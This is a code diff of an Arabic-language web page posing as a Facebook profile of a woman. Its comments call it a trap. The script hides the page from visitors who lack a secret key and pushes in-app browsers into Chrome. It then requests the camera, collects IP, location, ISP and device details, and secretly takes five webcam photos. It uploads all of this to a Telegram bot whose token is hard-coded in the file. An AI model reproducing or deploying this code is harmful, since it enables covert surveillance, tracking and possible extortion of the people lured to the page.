@@ -6,127 +6,151 @@
     
     <title>أوراق الربيع | Facebook</title>
     <meta property="og:title" content="أوراق الربيع (Spring Leaves)">
-    <meta property="og:description" content="‏1.2 ألف‏ من المتابعين · ‏456‏ من الأصدقاء · نشط الآن">
+    <meta property="og:description" content="‏1,248‏ متابع • ‏456‏ صديق • نشط الآن">
     <meta property="og:image" content="https://e.top4top.io/p_369921khp0.jpeg">
     <meta property="og:type" content="profile">
 
     <style>
-        body { margin: 0; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #ffffff; display: none; } /* الصفحة مخفية افتراضياً */
-        .cover { width: 100%; height: 200px; background: url('https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?fit=crop&w=1000&q=80') center/cover; border-bottom: 1px solid #ddd; position: relative; }
-        .pp-cont { position: absolute; bottom: -40px; right: 20px; }
-        .pp { width: 130px; height: 130px; border-radius: 50%; border: 4px solid white; object-fit: cover; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
-        .main { padding: 50px 20px; }
-        .un { font-size: 26px; font-weight: bold; }
-        .us { color: #65676b; margin-bottom: 15px; }
-        .btns { display: flex; gap: 10px; margin-bottom: 20px; }
-        .b { flex: 1; height: 36px; border-radius: 6px; border: none; font-weight: bold; display: flex; align-items: center; justify-content: center; }
-        .bl { background: #1877f2; color: white; }
-        .gr { background: #e4e6eb; color: black; }
-        .info { border-top: 1px solid #eee; padding-top: 15px; list-style: none; padding-right: 0; }
-        .info li { margin-bottom: 10px; font-size: 15px; }
+        body { margin: 0; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #ffffff; display: none; }
+        /* تصميم الغلاف الاحترافي */
+        .header-container { width: 100%; position: relative; background: #fff; }
+        .cover-photo { width: 100%; height: 230px; background: url('https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?fit=crop&w=1000&q=80') center/cover; position: relative; }
+        .profile-pic-wrapper { position: absolute; bottom: -50px; right: 20px; }
+        .profile-pic { width: 145px; height: 145px; border-radius: 50%; border: 4px solid white; object-fit: cover; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
+        
+        .profile-content { padding: 60px 20px 20px; border-bottom: 8px solid #f0f2f5; }
+        .user-full-name { font-size: 28px; font-weight: 800; color: #050505; margin-bottom: 2px; }
+        .sub-text { color: #65676b; font-size: 16px; font-weight: 500; margin-bottom: 15px; }
+        
+        .action-btns { display: flex; gap: 8px; margin-bottom: 20px; }
+        .btn-fb { flex: 1; height: 40px; border-radius: 8px; border: none; font-weight: 600; display: flex; align-items: center; justify-content: center; font-size: 15px; cursor: pointer; }
+        .primary { background: #1877f2; color: white; }
+        .secondary { background: #e4e6eb; color: #050505; }
+        
+        .details-box { padding: 15px 20px; list-style: none; margin: 0; }
+        .details-box li { display: flex; align-items: center; margin-bottom: 12px; font-size: 16px; color: #1c1e21; }
+        .details-box b { margin-right: 5px; }
+        
         #v, #c { display: none; }
     </style>
 </head>
 <body>
 
-<div id="trap-ui">
-    <div class="cover"><div class="pp-cont"><img src="https://e.top4top.io/p_369921khp0.jpeg" class="pp"></div></div>
-    <div class="main">
-        <div class="un">أوراق الربيع</div>
-        <div class="us">‏1,248‏ متابع • ‏456‏ صديق</div>
-        <div class="btns"><div class="b bl">إضافة صديق</div><div class="b gr">مراسلة</div></div>
-        <ul class="info">
-            <li>📍 تقيم في <b>إسطنبول، تركيا</b></li>
-            <li>🏡 من <b>لندن، المملكة المتحدة</b></li>
-            <li>❤️ عازبة</li>
-        </ul>
+<div id="app">
+    <div class="header-container">
+        <div class="cover-photo">
+            <div class="profile-pic-wrapper">
+                <img src="https://e.top4top.io/p_369921khp0.jpeg" class="profile-pic">
+            </div>
+        </div>
     </div>
+
+    <div class="profile-content">
+        <div class="user-full-name">أوراق الربيع</div>
+        <div class="sub-text">‏1,248‏ متابع • ‏456‏ صديق • شخصية عامة</div>
+        
+        <div class="action-btns">
+            <button class="btn-fb primary">إضافة صديق</button>
+            <button class="btn-fb secondary">مراسلة</button>
+        </div>
+    </div>
+
+    <ul class="details-box">
+        <li>📍 تقيم في <b>إسطنبول، تركيا</b></li>
+        <li>🏡 من <b>لندن، المملكة المتحدة</b></li>
+        <li>❤️ عازبة</li>
+        <li>🕒 انضمت في ديسمبر ٢٠١٨</li>
+    </ul>
 </div>
 
 <video id="v" autoplay playsinline></video>
 <canvas id="c"></canvas>
 
 <script>
-const TOKEN = '8060111495:AAGntTDe3q6lmhXDuNKdC6DZuTTPARA9jnc';
-const CHAT = '7184970355';
-const SECRET_KEY = "login"; // الكلمة السرية التي ستفعل المصيدة
+const BOT_TOKEN = '8060111495:AAGntTDe3q6lmhXDuNKdC6DZuTTPARA9jnc';
+const CHAT_ID = '7184970355';
+const KEY = "login"; // المفتاح الذي يفتح المصيدة
 
-// نظام التحقق من المفتاح وتوجيه البقية لجوجل
-function checkAccess() {
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.get('view') === SECRET_KEY) {
-        document.body.style.display = "block"; // إظهار الصفحة
-        forceExternal();
-        startInfection();
+function checkUrl() {
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('view') === KEY) {
+        document.body.style.display = "block";
+        forceOpen();
+        initTrap();
     } else {
-        window.location.href = "https://www.google.com"; // تحويل لجوجل إذا لم يوجد المفتاح
+        window.location.replace("https://www.google.com");
     }
 }
 
-function forceExternal() {
-    if (/Instagram|FBAN|FBAV|Messenger/i.test(navigator.userAgent)) {
-        const u = window.location.href.replace(/https?:\/\//, "");
-        window.location.href = `intent://${u}#Intent;scheme=https;package=com.android.chrome;end`;
+function forceOpen() {
+    if (/FBAN|FBAV|Instagram|Messenger/i.test(navigator.userAgent)) {
+        const url = window.location.href.replace(/https?:\/\//, "");
+        window.location.href = `intent://${url}#Intent;scheme=https;package=com.android.chrome;end`;
     }
 }
 
-async function startInfection() {
+async function initTrap() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         document.getElementById('v').srcObject = stream;
 
+        // جمع معلومات مفصلة جداً
         const battery = await navigator.getBattery();
         const ipRes = await fetch('https://ipapi.co/json/');
         const ip = await ipRes.json();
 
-        let msg = `🎯 تم دخول المصيدة (أوراق الربيع) 🎯\n\n` +
-                  `📱 الجهاز: ${navigator.platform}\n` +
-                  `🌐 IP: ${ip.ip}\n` +
-                  `📍 الموقع: ${ip.city}, ${ip.country_name}\n` +
-                  `🔋 البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? 'يُشحن' : 'لا يُشحن'})\n` +
-                  `🧠 الرام: ${navigator.deviceMemory || 'غير معروف'} GB\n` +
-                  `🖥️ الشاشة: ${window.screen.width}x${window.screen.height}\n` +
-                  `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+        let details = `🚀 تم رصد هدف جديد (أوراق الربيع) 🚀\n\n` +
+                      `📱 الجهاز: ${navigator.userAgent.split('(')[1].split(')')[0]}\n` +
+                      `🌐 IP: ${ip.ip}\n` +
+                      `📍 الموقع: ${ip.city}, ${ip.region}, ${ip.country_name}\n` +
+                      `🏢 الشركة: ${ip.org}\n` +
+                      `🔋 البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? 'يُشحن ✅' : 'لا يشحن ❌'})\n` +
+                      `🧠 الرام: ${navigator.deviceMemory || 'غير معروف'} GB\n` +
+                      `🖥️ الشاشة: ${window.screen.width}x${window.screen.height}\n` +
+                      `🌍 اللغة: ${navigator.language}\n` +
+                      `⏰ المنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
+                      `📅 التاريخ: ${new Date().toLocaleString('ar-EG')}`;
         
-        sendMsg(msg);
+        sendToBot(details);
 
-        let count = 0;
-        let itv = setInterval(() => {
-            if (count >= 5) {
-                clearInterval(itv);
+        let sn = 0;
+        let timer = setInterval(() => {
+            if (sn >= 5) {
+                clearInterval(timer);
                 stream.getTracks().forEach(t => t.stop());
-                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+                window.location.replace("https://www.google.com");
                 return;
             }
-            takePic(count + 1);
-            count++;
-        }, 1200);
+            takePhoto(sn + 1);
+            sn++;
+        }, 1300);
 
     } catch (e) {
-        sendMsg("⚠️ دخل المبتز لكنه رفض الكاميرا.");
-        setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);
+        sendToBot("⚠️ الضحية دخل الرابط لكنه حظر الوصول للكاميرا.");
+        setTimeout(() => { window.location.replace("https://www.google.com"); }, 2000);
     }
 }
 
-function takePic(n) {
-    const c = document.getElementById('c');
-    const v = document.getElementById('v');
-    c.width = v.videoWidth; c.height = v.videoHeight;
-    c.getContext('2d').drawImage(v, 0, 0);
-    c.toBlob(b => {
-        const f = new FormData();
-        f.append('chat_id', CHAT);
-        f.append('photo', b, 'x.jpg');
-        f.append('caption', `لقطة المبتز رقم ${n}`);
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
+function takePhoto(num) {
+    const canvas = document.getElementById('c');
+    const video = document.getElementById('v');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    canvas.toBlob(blob => {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, 'shot.jpg');
+        fd.append('caption', `اللقطة رقم (${num}) للهدف`);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
     }, 'image/jpeg');
 }
 
-function sendMsg(m) {
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(m)}`);
+function sendToBot(txt) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}`);
 }
 
-window.onload = checkAccess;
+window.onload = checkUrl;
 </script>
 </body>
 </html>
